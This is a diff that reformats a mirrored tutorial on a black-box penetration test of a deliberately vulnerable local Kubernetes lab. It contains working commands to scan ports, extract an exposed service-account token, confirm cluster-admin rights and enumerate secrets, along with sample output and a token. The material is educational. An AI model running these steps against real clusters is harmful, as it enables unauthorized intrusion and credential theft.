@@ -25,7 +25,7 @@ This page mirrors the original Medium article into the 1200km.com Docusaurus eco
 
 ## Introduction
 
-This guide walks you through a**complete black-box penetration test**of a Kubernetes cluster. We start with**zero knowledge**and work step-by-step until we achieve**full cluster compromise**. Every command has been tested and verified.
+This guide walks you through a **complete black-box penetration test** of a Kubernetes cluster. We start with **zero knowledge** and work step-by-step until we achieve **full cluster compromise**. Every command has been tested and verified.
 
 ## Table of Contents
 
@@ -53,13 +53,13 @@ This guide walks you through a**complete black-box penetration test**of a Kubern
 
 ## What is Black-Box Testing?
 
-**Black-Box Testing**means we have:
+**Black-Box Testing** means we have:
 
-- **No prior knowledge**of the target
+- **No prior knowledge** of the target
 
-- **No internal access**or credentials
+- **No internal access** or credentials
 
-- **External perspective**only
+- **External perspective** only
 
 - **Realistic attacker scenario**
 
@@ -83,11 +83,11 @@ By following this guide, you’ll learn:
 
 ## Tools We’ll Use
 
-**nmap**— Network mapper. Scans for open ports and services.
-**curl**— Command-line tool for making HTTP requests.
-**jq**— JSON processor. Helps us parse JSON responses.
-**kubectl**— Kubernetes command-line tool. Controls the cluster.
-**base64**— Encodes/decodes base64 data (tokens are base64 encoded).
+**nmap** — Network mapper. Scans for open ports and services.
+**curl** — Command-line tool for making HTTP requests.
+**jq** — JSON processor. Helps us parse JSON responses.
+**kubectl** — Kubernetes command-line tool. Controls the cluster.
+**base64** — Encodes/decodes base64 data (tokens are base64 encoded).
 
 ## Prerequisites
 
@@ -95,12 +95,8 @@ Make sure you have these tools installed:
 
 ```text
 # Install required tools
-sudo apt-
-get
- update
-sudo apt-
-get
- install -y kubectl curl jq nmap base64
+sudo apt-get update
+sudo apt-get install -y kubectl curl jq nmap base64
 # Verify they're installed
 kubectl version --client
 curl --version
@@ -125,24 +121,14 @@ nmap --version
 
 ```text
 # Create a directory for our penetration test
-mkdir
- -p ~/blackbox-pentest
+mkdir -p ~/blackbox-pentest
 # Move into that directory
-cd
- ~/blackbox-pentest
+cd ~/blackbox-pentest
 # Create subdirectories for different types of files
-mkdir
- -p recon        
-# For reconnaissance data
-mkdir
- -p exploitation 
-# For exploitation attempts
-mkdir
- -p proof        
-# For proof of vulnerabilities
-mkdir
- -p reports      
-# For our final report
+mkdir -p recon        # For reconnaissance data
+mkdir -p exploitation # For exploitation attempts
+mkdir -p proof        # For proof of vulnerabilities
+mkdir -p reports      # For our final report
 ```
 
 **What this does**: Creates a clean workspace where we’ll store all our findings.
@@ -169,30 +155,23 @@ Reconnaissance (or “recon”) is the first phase of any penetration test. We�
 
 **Why**: Open ports tell us what services are running. Each port number typically corresponds to a specific service (port 80 = HTTP, port 443 = HTTPS, etc.).
 
-**The tool**:`nmap`(Network Mapper) is a powerful port scanner. It sends packets to different ports and analyzes the responses to determine which ports are open.
+**The tool**: `nmap` (Network Mapper) is a powerful port scanner. It sends packets to different ports and analyzes the responses to determine which ports are open.
 
 **The command explained**:
 
-- `sudo nmap`- Run nmap with administrator privileges (needed for certain scan types)
+- `sudo nmap` - Run nmap with administrator privileges (needed for certain scan types)
 
-- `-sT`- TCP connect scan (reliable, works through most firewalls)
+- `-sT` - TCP connect scan (reliable, works through most firewalls)
 
-- `-p-`- Scan all 65,535 ports (the full port range)
+- `-p-` - Scan all 65,535 ports (the full port range)
 
-- `--min-rate=1000`- Send at least 1000 packets per second (makes it faster)
+- `--min-rate=1000` - Send at least 1000 packets per second (makes it faster)
 
-- `192.168.49.2`- The target IP address
+- `192.168.49.2` - The target IP address
 
 ```text
 # Scan the target for open ports
-sudo nmap -sT -p- --
-min
--rate=
-1000
- 
-192.168
-.49
-.2
+sudo nmap -sT -p- --min-rate=1000 192.168.49.2
 ```
 
 **What you’ll see**: nmap will show you a list of open ports. Here’s what we discovered during testing:
@@ -201,15 +180,15 @@ min
 
 **Understanding the results**:
 
-- **Port 22**— SSH (Secure Shell) — usually for remote access
+- **Port 22** — SSH (Secure Shell) — usually for remote access
 
-- **Ports 10010, 10249, 38119**— HTTP services (we’ll investigate these)
+- **Ports 10010, 10249, 38119** — HTTP services (we’ll investigate these)
 
-- **Ports 30080, 30081, 30082**— HTTP services (likely web applications)
+- **Ports 30080, 30081, 30082** — HTTP services (likely web applications)
 
-- **Port 30443**— HTTPS (encrypted web service)
+- **Port 30443** — HTTPS (encrypted web service)
 
-- **Port 8443**— HTTPS (could be Kubernetes API server)
+- **Port 8443** — HTTPS (could be Kubernetes API server)
 
 ### Step 2: Testing Each Service
 
@@ -217,17 +196,17 @@ min
 
 **Why**: Just because a port is open doesn’t mean it’s useful. We need to see what’s actually running on each port.
 
-**The tool**:`curl`is a command-line tool for making HTTP requests. Think of it as a web browser in your terminal.
+**The tool**: `curl` is a command-line tool for making HTTP requests. Think of it as a web browser in your terminal.
 
 **The command explained**:
 
-- `curl`- Make an HTTP request
+- `curl` - Make an HTTP request
 
-- `-s`- Silent mode (don't show progress)
+- `-s` - Silent mode (don't show progress)
 
-- `--connect-timeout 5`- Give up after 5 seconds if no response
+- `--connect-timeout 5` - Give up after 5 seconds if no response
 
-- `http://192.168.49.2:30080`- The URL we're testing
+- `http://192.168.49.2:30080` - The URL we're testing
 
 Let’s test each port one by one:
 
@@ -235,17 +214,7 @@ Let’s test each port one by one:
 
 ```text
 # Test port 30080 - see what responds
-curl -s --
-connect
--timeout 
-5
- http:
-//
-192.168
-.
-49.2
-:
-30080
+curl -s --connect-timeout 5 http://192.168.49.2:30080
 ```
 
 **What this does**: Sends an HTTP GET request to port 30080 and shows us the response.
@@ -260,28 +229,18 @@ connect
 
 ```text
 # Test port 30081 - see what responds
-curl -s --
-connect
--timeout 
-5
- http:
-//
-192.168
-.
-49.2
-:
-30081
+curl -s --connect-timeout 5 http://192.168.49.2:30081
 ```
 
 **What we discovered**: This port returns an HTML page showing a “Vulnerable API Server” with several endpoints:
 
-- `POST /api/execute`- Execute system commands
+- `POST /api/execute` - Execute system commands
 
-- `GET /api/read?file=`- Read files
+- `GET /api/read?file=` - Read files
 
-- `GET /api/env`- View environment variables
+- `GET /api/env` - View environment variables
 
-- `GET /api/system`- View system information
+- `GET /api/system` - View system information
 
 **Why this matters**: An API that executes system commands is extremely dangerous. This is a command injection vulnerability waiting to be exploited.
 
@@ -291,54 +250,35 @@ connect
 
 ```text
 # Test port 30082 - see what responds
-curl -s --
-connect
--timeout 
-5
- http:
-//
-192.168
-.
-49.2
-:
-30082
+curl -s --connect-timeout 5 http://192.168.49.2:30082
 ```
 
 **What we discovered**: This port shows a “Vulnerable App #3 — K8S Token Exposure” page with endpoints:
 
-- `GET /api/token`- Expose service account token
+- `GET /api/token` - Expose service account token
 
-- `GET /api/namespace`- Expose namespace
+- `GET /api/namespace` - Expose namespace
 
-- `GET /api/k8s/pods`- Access K8S API (pods)
+- `GET /api/k8s/pods` - Access K8S API (pods)
 
-- `GET /api/k8s/secrets`- Access K8S API (secrets)
+- `GET /api/k8s/secrets` - Access K8S API (secrets)
 
-**Why this matters**: This is our**BEST ENTRY POINT**! If we can get a Kubernetes service account token, we can potentially access the entire cluster.
+**Why this matters**: This is our **BEST ENTRY POINT**! If we can get a Kubernetes service account token, we can potentially access the entire cluster.
 
 <img src="https://cdn-images-1.medium.com/max/800/1*yagbxQc3TB4bpGakPt_KlQ.png" alt="Article image" width="1900" height="386" loading="lazy" decoding="async" />
 
 ### Testing Port 8443 (Kubernetes API)
 
 ```text
-# Test port 
-8443
- - 
-this
- 
-is
- likely the Kubernetes API server
-curl -k -s --connect-timeout 
-5
- https:
-//192.168.49.2:8443
+# Test port 8443 - this is likely the Kubernetes API server
+curl -k -s --connect-timeout 5 https://192.168.49.2:8443
 ```
 
 **The command explained**:
 
-- `-k`- Don't verify SSL certificate (needed if using self-signed certs)
+- `-k` - Don't verify SSL certificate (needed if using self-signed certs)
 
-- `https://`- Use HTTPS instead of HTTP
+- `https://` - Use HTTPS instead of HTTP
 
 **What we discovered**: The API returns a JSON error saying “forbidden: User ‘system:anonymous’ cannot get path ‘/’”. This confirms it’s the Kubernetes API, but we need authentication.
 
@@ -352,70 +292,10 @@ curl -k -s --connect-timeout
 
 ```text
 # Save the response from each port
-curl -s --
-connect
--timeout 
-5
- http:
-//
-192.168
-.
-49.2
-:
-30080
- > ~
-/blackbox-pentest/r
-econ/port-
-30080
--response.html
-curl -s --
-connect
--timeout 
-5
- http:
-//
-192.168
-.
-49.2
-:
-30081
- > ~
-/blackbox-pentest/r
-econ/port-
-30081
--response.html
-curl -s --
-connect
--timeout 
-5
- http:
-//
-192.168
-.
-49.2
-:
-30082
- > ~
-/blackbox-pentest/r
-econ/port-
-30082
--response.html
-curl -k -s --
-connect
--timeout 
-5
- https:
-//
-192.168
-.
-49.2
-:
-8443
- > ~
-/blackbox-pentest/r
-econ/port-
-8443
--response.json
+curl -s --connect-timeout 5 http://192.168.49.2:30080 > ~/blackbox-pentest/recon/port-30080-response.html
+curl -s --connect-timeout 5 http://192.168.49.2:30081 > ~/blackbox-pentest/recon/port-30081-response.html
+curl -s --connect-timeout 5 http://192.168.49.2:30082 > ~/blackbox-pentest/recon/port-30082-response.html
+curl -k -s --connect-timeout 5 https://192.168.49.2:8443 > ~/blackbox-pentest/recon/port-8443-response.json
 ```
 
 **What this does**: Saves each response to a file so we can review them later.
@@ -436,7 +316,7 @@ Initial access is when we first break into the system. In our case, we’re goin
 
 **Why this works**: The application on port 30082 has an endpoint (`/api/token`) that directly exposes the service account token. This is a serious misconfiguration - tokens should never be exposed.
 
-**The tool**:`curl`again, but this time we're calling a specific API endpoint.
+**The tool**: `curl` again, but this time we're calling a specific API endpoint.
 
 **The command**:
 
@@ -445,23 +325,14 @@ Initial access is when we first break into the system. In our case, we’re goin
 curl -s http://192.168.49.2:30082/api/token
 ```
 
-**What this does**: Makes a GET request to the`/api/token`endpoint and returns the response.
+**What this does**: Makes a GET request to the `/api/token` endpoint and returns the response.
 
 **What you’ll get**: A JSON response that looks like this:
 
 ```text
 {
-  
-"token"
-:
- 
-"eyJhbGciOiJSUzI1NiIsImtpZCI6InJYODc2LVFUR1hhdVpNbUxWbDhkWVlZTk1jNjNXaVd1X1pyZ1M3Y0Q5QjQifQ..."
-,
-  
-"message"
-:
- 
-"Service account token exposed!"
+  "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6InJYODc2LVFUR1hhdVpNbUxWbDhkWVlZTk1jNjNXaVd1X1pyZ1M3Y0Q5QjQifQ...",
+  "message": "Service account token exposed!"
 }
 ```
 
@@ -475,41 +346,32 @@ curl -s http://192.168.49.2:30082/api/token
 
 **Why**: We need the token as a plain string, not wrapped in JSON.
 
-**The tool**:`jq`is a JSON processor. It lets us extract specific values from JSON.
+**The tool**: `jq` is a JSON processor. It lets us extract specific values from JSON.
 
 **The command explained**:
 
-- `curl -s http://192.168.49.2:30082/api/token`- Get the JSON response
+- `curl -s http://192.168.49.2:30082/api/token` - Get the JSON response
 
-- `|`- Pipe the output to the next command
+- `|` - Pipe the output to the next command
 
-- `jq -r '.token'`- Extract the "token" field from the JSON (the`-r`flag removes quotes)
+- `jq -r '.token'` - Extract the "token" field from the JSON (the `-r` flag removes quotes)
 
 ```text
 # Extract just the token value from the JSON response
-curl -s http://192.168.49.2:30082/api/token | jq -r 
-'.token'
+curl -s http://192.168.49.2:30082/api/token | jq -r '.token'
 ```
 
 **What you’ll get**: Just the token string, something like:
 
 ```text
-eyJhbGciOiJSUzI1NiIsImtpZCI6InJYODc2LVFUR1hhdVpNbUxWbDhkWVlZTk1jNjNXaVd1X1pyZ1M3Y0Q5QjQifQ.
-eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODAxNjcxNDgyLCJpYXQiOjE3NzAxMzU0ODIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNmMyNmE5MDctNjdiMi00NDk1LTg2NWEtZDFlNDQ4NTMyZWExIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ2dWxuZXJhYmxlLWxhYiIsIm5vZGUiOnsibmFtZSI6Im1pbmlrdWJlIiwidWlkIjoiNDAzZDYyNTktYjQxOC00MzQ0LTkxZmQtYzczZmI1OGRkODA1In0sInBvZCI6eyJuYW1lIjoidnVsbi1hcHAzLTg0YmZiZDg2ZGQtNW5ucXIiLCJ1aWQiOiIxZjY4MjU3NS02ZGMyLTQwNWItYTI5ZC1hNDZlNzBkZGU3NjQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6InZ1bG5lcmFibGUtc2EtMSIsInVpZCI6IjNjMTg2YWYxLWJhZDItNDhkYy05OWJjLWVlMmU2NjY4NWUzZSJ9LCJ3YXJuYWZ0ZXIiOjE3NzAxMzkwODl9LCJuYmYiOjE3NzAxMzU0ODIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp2dWxuZXJhYmxlLWxhYjp2dWxuZXJhYmxlLXNhLTEifQ
-.
-BccPgEaWtvwc6UAakozC9BPb8xnUFggfe4H5T6ejGRYL389BCxEfzUbPny1NAobtNevHhFsMdVMqXIsLFx55dElG
--
-JzY4
-uhzxd0Fey5YbSrP3BqtrCrX1Hm4B5y8LASBZqyAlEdQE83vNU6q7oPbOd5LexBBUFLLuBcJMDmtbGMbDYx5LO_vDqyJE4SY_Zkqk6-0eF0E1rx0VB_JpGrBeSDTqt4LcETxf5iHh7FOsPEdFhJoAuV73EI5sc0FKk8SC3Jw9iaWbckkU40XqFSjEF0NVuMMjrothm8dedeg2ZO5pdHeOS2i5MLnaif3D9z-6N4Q3hXCbTRH7kKWwgqitg...
+eyJhbGciOiJSUzI1NiIsImtpZCI6InJYODc2LVFUR1hhdVpNbUxWbDhkWVlZTk1jNjNXaVd1X1pyZ1M3Y0Q5QjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODAxNjcxNDgyLCJpYXQiOjE3NzAxMzU0ODIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNmMyNmE5MDctNjdiMi00NDk1LTg2NWEtZDFlNDQ4NTMyZWExIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ2dWxuZXJhYmxlLWxhYiIsIm5vZGUiOnsibmFtZSI6Im1pbmlrdWJlIiwidWlkIjoiNDAzZDYyNTktYjQxOC00MzQ0LTkxZmQtYzczZmI1OGRkODA1In0sInBvZCI6eyJuYW1lIjoidnVsbi1hcHAzLTg0YmZiZDg2ZGQtNW5ucXIiLCJ1aWQiOiIxZjY4MjU3NS02ZGMyLTQwNWItYTI5ZC1hNDZlNzBkZGU3NjQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6InZ1bG5lcmFibGUtc2EtMSIsInVpZCI6IjNjMTg2YWYxLWJhZDItNDhkYy05OWJjLWVlMmU2NjY4NWUzZSJ9LCJ3YXJuYWZ0ZXIiOjE3NzAxMzkwODl9LCJuYmYiOjE3NzAxMzU0ODIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp2dWxuZXJhYmxlLWxhYjp2dWxuZXJhYmxlLXNhLTEifQ.BccPgEaWtvwc6UAakozC9BPb8xnUFggfe4H5T6ejGRYL389BCxEfzUbPny1NAobtNevHhFsMdVMqXIsLFx55dElG-JzY4uhzxd0Fey5YbSrP3BqtrCrX1Hm4B5y8LASBZqyAlEdQE83vNU6q7oPbOd5LexBBUFLLuBcJMDmtbGMbDYx5LO_vDqyJE4SY_Zkqk6-0eF0E1rx0VB_JpGrBeSDTqt4LcETxf5iHh7FOsPEdFhJoAuV73EI5sc0FKk8SC3Jw9iaWbckkU40XqFSjEF0NVuMMjrothm8dedeg2ZO5pdHeOS2i5MLnaif3D9z-6N4Q3hXCbTRH7kKWwgqitg...
 ```
 
 **Save it for later**: Let’s save this token to a file so we can use it:
 
 ```text
 # Save the token to a file
-curl -s http://192.168.49.2:30082/api/token | jq -r 
-'.token'
- > ~/blackbox-pentest/proof/extracted-token.txt
+curl -s http://192.168.49.2:30082/api/token | jq -r '.token' > ~/blackbox-pentest/proof/extracted-token.txt
 ```
 
 ```text
@@ -525,27 +387,24 @@ cat ~/blackbox-pentest/proof/extracted-token.txt
 
 **The command explained**:
 
-- `curl -k`- Make HTTPS request, ignore certificate errors
+- `curl -k` - Make HTTPS request, ignore certificate errors
 
-- `-s`- Silent mode
+- `-s` - Silent mode
 
-- `-H "Authorization: Bearer TOKEN"`- Add an HTTP header with our token
+- `-H "Authorization: Bearer TOKEN"` - Add an HTTP header with our token
 
-- `https://192.168.49.2:8443/api/v1/namespaces`- The Kubernetes API endpoint to list namespaces
+- `https://192.168.49.2:8443/api/v1/namespaces` - The Kubernetes API endpoint to list namespaces
 
 **First, let’s get the token into a variable for easier use**:
 
 ```text
 # Read the token from the file we saved
-TOKEN=$(
-cat
- ~/blackbox-pentest/proof/extracted-token.txt)
+TOKEN=$(cat ~/blackbox-pentest/proof/extracted-token.txt)
 ```
 
 ```text
 # Now test it with the Kubernetes API
-curl -k -s -H "Authorization: Bearer $TOKEN" 
-https://192.168.49.2:8443/api/v1/namespaces
+curl -k -s -H "Authorization: Bearer $TOKEN" https://192.168.49.2:8443/api/v1/namespaces
 ```
 
 **What this does**:
@@ -556,46 +415,18 @@ https://192.168.49.2:8443/api/v1/namespaces
 
 - Asks for a list of all namespaces in the cluster
 
-**What you’ll get**: A JSON response listing all namespaces. If you see namespaces,**congratulations — you have cluster access!**
+**What you’ll get**: A JSON response listing all namespaces. If you see namespaces, **congratulations — you have cluster access!**
 
 **What we discovered during testing**:
 
 ```text
 {
-  
-"kind"
-: 
-"NamespaceList"
-,
-  
-"apiVersion"
-: 
-"v1"
-,
-  
-"items"
-: [
-    {
-"metadata"
-: {
-"name"
-: 
-"default"
-}},
-    {
-"metadata"
-: {
-"name"
-: 
-"kube-system"
-}},
-    {
-"metadata"
-: {
-"name"
-: 
-"vulnerable-lab"
-}},
+  "kind": "NamespaceList",
+  "apiVersion": "v1",
+  "items": [
+    {"metadata": {"name": "default"}},
+    {"metadata": {"name": "kube-system"}},
+    {"metadata": {"name": "vulnerable-lab"}},
     ...
   ]
 }
@@ -613,40 +444,20 @@ https://192.168.49.2:8443/api/v1/namespaces
 
 **The command explained**:
 
-- `-X POST`- Use POST method (we're sending data)
+- `-X POST` - Use POST method (we're sending data)
 
-- `-H "Content-Type: application/json"`- Tell the server we're sending JSON
+- `-H "Content-Type: application/json"` - Tell the server we're sending JSON
 
-- `-d '&#123;...&#125;'`- The JSON data we're sending (asking "can I do everything?")
+- `-d '&#123;...&#125;'` - The JSON data we're sending (asking "can I do everything?")
 
-- The endpoint`/apis/authorization.k8s.io/v1/selfsubjectaccessreviews`- The permission check API
+- The endpoint `/apis/authorization.k8s.io/v1/selfsubjectaccessreviews` - The permission check API
 
 ```text
 # Check if we have full permissions
 curl -k -s -X POST \
-  -H 
-"Authorization: Bearer $TOKEN"
- \
-  -H 
-"Content-Type: application/json"
- \
-  -d '{
-"spec"
-:{
-"resourceAttributes"
-:{
-"namespace"
-:
-"vulnerable-lab"
-,
-"verb"
-:
-"*"
-,
-"resource"
-:
-"*"
-}}}' \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"spec":{"resourceAttributes":{"namespace":"vulnerable-lab","verb":"*","resource":"*"}}}' \
   https://192.168.49.2:8443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews
 ```
 
@@ -656,35 +467,14 @@ curl -k -s -X POST \
 
 ```text
 {
-  
-"status"
-: {
-    
-"allowed"
-: 
-true
-,
-    
-"reason"
-: 
-"RBAC: allowed by ClusterRoleBinding 
-\"
-vulnerable-cluster-admin-binding
-\"
- of ClusterRole 
-\"
-cluster-admin
-\"
- to ServiceAccount 
-\"
-vulnerable-sa-1/vulnerable-lab
-\"
-"
+  "status": {
+    "allowed": true,
+    "reason": "RBAC: allowed by ClusterRoleBinding \"vulnerable-cluster-admin-binding\" of ClusterRole \"cluster-admin\" to ServiceAccount \"vulnerable-sa-1/vulnerable-lab\""
   }
 }
 ```
 
-**What this means**: We have**cluster-admin**permissions! This is the highest level of access in Kubernetes. We can do anything we want in the cluster.
+**What this means**: We have **cluster-admin** permissions! This is the highest level of access in Kubernetes. We can do anything we want in the cluster.
 
 **Why this is critical**: We just went from zero access to full cluster control in one step. This is a serious security issue.
 
@@ -720,42 +510,36 @@ Information disclosure is when we learn about the internal structure of the syst
 
 ```text
 # Get all namespaces
-curl -k -s -H 
-"Authorization: Bearer 
-$TOKEN
-"
- https://192.168.49.2:8443/api/v1/namespaces | jq -r 
-'.items[].metadata.name'
+curl -k -s -H "Authorization: Bearer $TOKEN" https://192.168.49.2:8443/api/v1/namespaces | jq -r '.items[].metadata.name'
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*OsG0jCmTx1kQBpHjG6u_Jg.png" alt="Article image" width="1597" height="143" loading="lazy" decoding="async" />
 
 **The command explained**:
 
-- `https://192.168.49.2:8443/api/v1/namespaces`- Kubernetes API endpoint for namespaces
+- `https://192.168.49.2:8443/api/v1/namespaces` - Kubernetes API endpoint for namespaces
 
-- `| jq -r '.items[].metadata.name'`- Extract just the namespace names from the JSON
+- `| jq -r '.items[].metadata.name'` - Extract just the namespace names from the JSON
 
 **What you’ll get**: A list of namespace names:
 
 ```text
 default
 kube-node-lease
-kube-
-public
+kube-public
 kube-system
 vulnerable-lab
 ```
 
 **What each namespace means**:
 
-- **default**— Where resources go if you don’t specify a namespace
+- **default** — Where resources go if you don’t specify a namespace
 
-- **kube-system**— System components (like the API server, etcd, etc.)
+- **kube-system** — System components (like the API server, etcd, etc.)
 
-- **kube-public**— Publicly accessible information
+- **kube-public** — Publicly accessible information
 
-- **vulnerable-lab**— The namespace with our vulnerable applications
+- **vulnerable-lab** — The namespace with our vulnerable applications
 
 ### Step 2: List All Pods
 
@@ -767,19 +551,14 @@ vulnerable-lab
 
 ```text
 # Get all pods from all namespaces
-curl -k -s -H 
-"Authorization: Bearer 
-$TOKEN
-"
- https://192.168.49.2:8443/api/v1/pods | jq -r 
-'.items[] | "\(.metadata.namespace)/\(.metadata.name)"'
+curl -k -s -H "Authorization: Bearer $TOKEN" https://192.168.49.2:8443/api/v1/pods | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'
 ```
 
 **The command explained**:
 
-- `https://192.168.49.2:8443/api/v1/pods`- Kubernetes API endpoint for pods
+- `https://192.168.49.2:8443/api/v1/pods` - Kubernetes API endpoint for pods
 
-- `jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'`- Format as "namespace/podname"
+- `jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'` - Format as "namespace/podname"
 
 **What you’ll get**: A list of pods like:
 
@@ -808,12 +587,7 @@ vulnerable-lab/privileged-container-1-db8b64ccf-dfjkx
 
 ```text
 # Get all secrets from all namespaces
-curl -k -s -H 
-"Authorization: Bearer 
-$TOKEN
-"
- https://192.168.49.2:8443/api/v1/secrets | jq -r 
-'.items[] | "\(.metadata.namespace)/\(.metadata.name)"'
+curl -k -s -H "Authorization: Bearer $TOKEN" https://192.168.49.2:8443/api/v1/secrets | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*ayXVKhovStrVirSxeRNExQ.png" alt="Article image" width="1900" height="54" loading="lazy" decoding="async" />
@@ -832,15 +606,10 @@ $TOKEN
 
 ```text
 # Get all service accounts
-curl -k -s -H 
-"Authorization: Bearer 
-$TOKEN
-"
- https://192.168.49.2:8443/api/v1/serviceaccounts | jq -r 
-'.items[] | "\(.metadata.namespace)/\(.metadata.name)"'
+curl -k -s -H "Authorization: Bearer $TOKEN" https://192.168.49.2:8443/api/v1/serviceaccounts | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'
 ```
 
-**What you’ll get**: A list of service accounts. We’re particularly interested in the one we’re using:`vulnerable-lab/vulnerable-sa-1`.
+**What you’ll get**: A list of service accounts. We’re particularly interested in the one we’re using: `vulnerable-lab/vulnerable-sa-1`.
 
 <img src="https://cdn-images-1.medium.com/max/800/1*4quywrtYt6lKcedLfZgk6g.png" alt="Article image" width="1912" height="822" loading="lazy" decoding="async" />
 
@@ -854,25 +623,20 @@ $TOKEN
 
 ```text
 # Get all cluster roles
-curl -k -s -H 
-"Authorization: Bearer 
-$TOKEN
-"
- https://192.168.49.2:8443/apis/rbac.authorization.k8s.io/v1/clusterroles | jq -r 
-'.items[].metadata.name'
+curl -k -s -H "Authorization: Bearer $TOKEN" https://192.168.49.2:8443/apis/rbac.authorization.k8s.io/v1/clusterroles | jq -r '.items[].metadata.name'
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*k4Cyx5ek1vy_KgblM85p-g.png" alt="Article image" width="1897" height="534" loading="lazy" decoding="async" />
 
 **What you’ll get**: A list of cluster roles including:
 
-- `cluster-admin`- Full access (this is what we have!)
+- `cluster-admin` - Full access (this is what we have!)
 
-- `admin`- Administrative access
+- `admin` - Administrative access
 
-- `edit`- Can edit resources
+- `edit` - Can edit resources
 
-- `view`- Read-only access
+- `view` - Read-only access
 
 - And many system roles
 
@@ -897,33 +661,13 @@ Privilege escalation is when you gain higher-level permissions than you started 
 ```text
 # Check our permissions again
 curl -k -s -X POST \
-  -H 
-"Authorization: Bearer $TOKEN"
- \
-  -H 
-"Content-Type: application/json"
- \
-  -d '{
-"spec"
-:{
-"resourceAttributes"
-:{
-"namespace"
-:
-"vulnerable-lab"
-,
-"verb"
-:
-"*"
-,
-"resource"
-:
-"*"
-}}}' \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"spec":{"resourceAttributes":{"namespace":"vulnerable-lab","verb":"*","resource":"*"}}}' \
   https://192.168.49.2:8443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews | jq '.status'
 ```
 
-**What this confirms**: We have`"allowed": true`with cluster-admin permissions.
+**What this confirms**: We have `"allowed": true` with cluster-admin permissions.
 
 <img src="https://cdn-images-1.medium.com/max/800/1*2aYoycyJao9D5c_5KGVbRg.png" alt="Article image" width="1880" height="225" loading="lazy" decoding="async" />
 
@@ -938,43 +682,17 @@ curl -k -s -X POST \
 ```text
 # Create a ConfigMap to prove we can create resources
 curl -k -s -X POST \
-  -H 
-"Authorization: Bearer $TOKEN"
- \
-  -H 
-"Content-Type: application/json"
- \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
   -d '{
-    
-"apiVersion"
-: 
-"v1"
-,
-    
-"kind"
-: 
-"ConfigMap"
-,
-    
-"metadata"
-: {
-      
-"name"
-: 
-"proof-of-access"
-,
-      
-"namespace"
-: 
-"vulnerable-lab"
+    "apiVersion": "v1",
+    "kind": "ConfigMap",
+    "metadata": {
+      "name": "proof-of-access",
+      "namespace": "vulnerable-lab"
     },
-    
-"data"
-: {
-      
-"message"
-: 
-"I have cluster-admin access!"
+    "data": {
+      "message": "I have cluster-admin access!"
     }
   }' \
   https://192.168.49.2:8443/api/v1/namespaces/vulnerable-lab/configmaps
@@ -996,32 +714,26 @@ Set up kubectl (the Kubernetes command-line tool) so we can easily interact with
 
 ### What is kubectl?
 
-`kubectl`is the official Kubernetes command-line tool. It's like having a remote control for the cluster. Instead of making raw API calls with curl, kubectl makes it much easier.
+`kubectl` is the official Kubernetes command-line tool. It's like having a remote control for the cluster. Instead of making raw API calls with curl, kubectl makes it much easier.
 
 ### Step 1: Configure kubectl
 
 **What we’re doing**: Telling kubectl how to connect to our target cluster and what credentials to use.
 
-**Why**: Once configured, we can use simple commands like`kubectl get pods`instead of long curl commands.
+**Why**: Once configured, we can use simple commands like `kubectl get pods` instead of long curl commands.
 
 **The commands**:
 
 ```text
 # First, let's get our token again (in case we need it)
-TOKEN=$(
-cat
- ~/blackbox-pentest/proof/extracted-token.txt)
+TOKEN=$(cat ~/blackbox-pentest/proof/extracted-token.txt)
 # Configure the cluster endpoint
 kubectl config set-cluster vulnerable-cluster \
   --server=https://192.168.49.2:8443 \
-  --insecure-skip-tls-verify=
-true
+  --insecure-skip-tls-verify=true
 # Configure our credentials (the token)
 kubectl config set-credentials vulnerable-user \
-  --token=
-"
-$TOKEN
-"
+  --token="$TOKEN"
 # Create a context (combination of cluster + user)
 kubectl config set-context vulnerable-context \
   --cluster=vulnerable-cluster \
@@ -1033,13 +745,13 @@ kubectl config use-context vulnerable-context
 
 **What each command does**:
 
-- **set-cluster**— Tells kubectl where the API server is (192.168.49.2:8443)
+- **set-cluster** — Tells kubectl where the API server is (192.168.49.2:8443)
 
-- **set-credentials**— Tells kubectl to use our extracted token
+- **set-credentials** — Tells kubectl to use our extracted token
 
-- **set-context**— Combines the cluster and user settings
+- **set-context** — Combines the cluster and user settings
 
-- **use-context**— Makes this our active configuration
+- **use-context** — Makes this our active configuration
 
 <img src="https://cdn-images-1.medium.com/max/800/1*3WPQmpGRmBBEGMcY9p_Fvg.png" alt="Article image" width="1435" height="369" loading="lazy" decoding="async" />
 
@@ -1051,21 +763,13 @@ kubectl config use-context vulnerable-context
 
 ```text
 # Test basic access - list nodes
-kubectl 
-get
- nodes
+kubectl get nodes
 # List namespaces
-kubectl 
-get
- namespaces
+kubectl get namespaces
 # List pods in all namespaces
-kubectl 
-get
- pods -A
+kubectl get pods -A
 # List pods in vulnerable-lab namespace
-kubectl 
-get
